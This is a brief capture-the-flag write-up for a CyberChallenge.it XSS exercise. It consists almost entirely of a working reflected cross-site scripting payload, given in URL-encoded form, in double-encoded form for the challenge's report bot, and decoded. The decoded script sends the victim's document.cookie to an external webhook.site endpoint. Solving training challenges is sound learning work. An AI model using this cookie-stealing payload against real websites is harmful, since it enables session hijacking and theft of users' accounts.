# XSS 01

http://xss1.challs.cyberchallenge.it/


## Payload

http://xss1.challs.cyberchallenge.it/?html=%3Cscript%3Efetch%28%22https%3A%2F%2Fwebhook.site%2F273ce221-3915-4d76-80fe-8353bb5cc526%2F%22%2Bdocument.cookie%29%3B%3C%2Fscript%3E

REPORT

```
http://xss1.challs.cyberchallenge.it/report?url=http%3A%2F%2Fxss1.challs.cyberchallenge.it%2F%3Fhtml%3D%253Cscript%253Efetch%2528%2522https%253A%252F%252Fwebhook.site%252F273ce221-3915-4d76-80fe-8353bb5cc526%252F%2522%252Bdocument.cookie%2529%253B%253C%252Fscript%253E
```

```
<script>
    fetch("https://webhook.site/273ce221-3915-4d76-80fe-8353bb5cc526/"+document.cookie);
</script>
```